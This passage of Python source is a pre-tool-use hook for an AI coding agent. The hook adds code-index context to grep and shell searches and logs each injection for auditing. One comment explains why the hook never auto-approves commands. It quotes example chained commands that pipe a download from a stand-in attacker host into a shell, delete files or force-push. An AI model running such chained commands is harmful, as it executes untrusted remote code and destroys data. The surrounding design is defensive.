        # ONLY SPEAK WHEN THE INDEX IS ACTUALLY BEHIND. This fires on every miss,
        # and a notice that always hedges is the failure #598 explicitly guarded
        # against: it gets ignored, and takes the real warnings with it. A
        # complete, current index stays silent — the absence really is an absence.
        #
        # index_freshness is ~21ms over 228 files. Affordable HERE, on the path
        # where the alternative is the agent cold-reading a subsystem, and
        # deliberately not on the hit path, which already returned symbols.
        notice = None
        try:
            with bounded_hook(config.hooks.timeout_s, label="pre_tool_use"):
                from pathlib import Path

                from techne.core.codegraph import index_freshness, zero_result_notice
                from techne.core.repo import find_repo_root

                # Path(), not start_path directly: it arrives as a str from the
                # hook payload and find_repo_root does .is_dir() on it. Without
                # this the whole check raised, was caught by the degrade branch
                # below, and the rail stayed silent — passing every test that
                # asserted silence while delivering nothing.
                idx = index_freshness(db_path, repo_root=find_repo_root(Path(start_path)))
                if _index_is_behind(idx):
                    notice = zero_result_notice(idx)
        except Exception as e:  # noqa: BLE001  — catches HookTimeout too
            # Degrading to the old silence is correct: this path exists to ADD a
            # caveat, and a hook that cannot compute one must not block the tool.
            print(f"techne: grep-assist freshness check degraded: {e}", file=sys.stderr)

        if notice is None:
            record_hook_run(techne_db, HOOK_NAME, outcome="noop:no-results")
            sys.exit(0)

        try:
            print(
                json.dumps(
                    {
                        "hookSpecificOutput": {
                            "hookEventName": "PreToolUse",
                            "additionalContext": f"techne codex — {notice}",
                        }
                    }
                )
            )
            record_hook_run(techne_db, HOOK_NAME, outcome="ok:no-results-qualified")
        except Exception as e:  # noqa: BLE001
            print(f"techne: grep-assist emit failed: {e}", file=sys.stderr)
            record_hook_run(
                techne_db,
                HOOK_NAME,
                outcome="noop:emit-failed",
                error={"stage": "emit-notice", "msg": f"{type(e).__name__}: {e}"},
            )
        sys.exit(0)

    # ------------------------------------------------------------------
    # Emit the protocol JSON (additionalContext ONLY) and exit 0.
    #
    # NO `permissionDecision` — AND ITS ABSENCE IS THE SECURITY PROPERTY (#596 r7,
    # Critical). This hook emitted `"permissionDecision": "allow"` unconditionally,
    # which dates from #208 when the matcher was `Grep` alone: auto-approving a
    # read-only Grep is nearly harmless. THIS PR WIDENED THE MATCHER TO
    # `Grep|Bash`, and an `allow` on a Bash call grants THE WHOLE COMMAND LINE —
    # while `_bash_search_pattern` only has to like ONE SEGMENT of it. Measured:
    #
    #   grep my_symbol src && rm -rf /tmp/something          -> pattern found
    #   grep my_symbol src; curl http://evil.example/x | sh  -> pattern found
    #   rg my_symbol src && git push --force origin main     -> pattern found
    #
    # A context-augmentation rail must never be a permission oracle. It has no
    # opinion about whether the command should run; it only has symbols to add.
    # `post_tool_use.py` already ships exactly this shape.
    # ------------------------------------------------------------------
    try:
        context = _build_context(pattern, results)
        print(
            json.dumps(
                {
                    "hookSpecificOutput": {
                        "hookEventName": "PreToolUse",
                        "additionalContext": context,
                    }
                }
            )
        )
    except Exception as e:  # noqa: BLE001
        print(f"techne: grep-assist emit failed: {e}", file=sys.stderr)
        record_hook_run(
            techne_db,
            HOOK_NAME,
            outcome="noop:emit-failed",
            error={"stage": "emit", "msg": f"{type(e).__name__}: {e}"},
        )
        sys.exit(0)

    # The one path where the rail actually did its job. `detail` carries the
    # symbol count so `techne status` can show utilization, not just liveness.
    record_hook_run(techne_db, HOOK_NAME, outcome="ok", detail=f"{len(results)} symbols")

    # AND LOG THE DELIVERY WHERE THE AUDIT CAN SEE IT (techne#637). Every other
    # injecting rail writes to `context_injections`; this one wrote only to the
    # liveness marker — a SINGLE row with no counter and no history — so
    # `SELECT source FROM context_injections` had zero grep-assist rows, ever, and
    # `techne audit` was structurally blind to this rail.
    #
    # THAT IS WORSE HERE THAN ANYWHERE ELSE, because this is the rail with the
    # worst track record: it produced #596, #601, #611 and #612, and its whole
    # history is of looking healthy while doing nothing. #612 closed by dogfood —
    # one person, one search, one block — and that remains the ONLY delivery it
    # has ever been able to demonstrate, precisely because nothing durable
    # recorded the others. The utilization card's founding rule, "INSTRUMENT READS
    # BEFORE ADDING RETRIEVAL", was unmet by the one rail that had already burned
    # us twice.
    #
    # Best-effort by contract (log_context_injection never raises), and AFTER the
    # emit: the augmentation is the job, the measurement must never cost it.
    try:
        from techne.hooks._injection_log import log_context_injection

        log_context_injection(
            config.db_path,
            source=HOOK_NAME,
            session_id=data.get("session_id"),
            trigger=pattern,
            rows=results,
            injected_text=context,
            k_requested=config.hooks.codex_grep_assist_limit,
        )
    except Exception as e:  # noqa: BLE001 — measurement must never break the rail
        print(f"techne: grep-assist injection log skipped: {e}", file=sys.stderr)
    sys.exit(0)


if __name__ == "__main__":
    main()
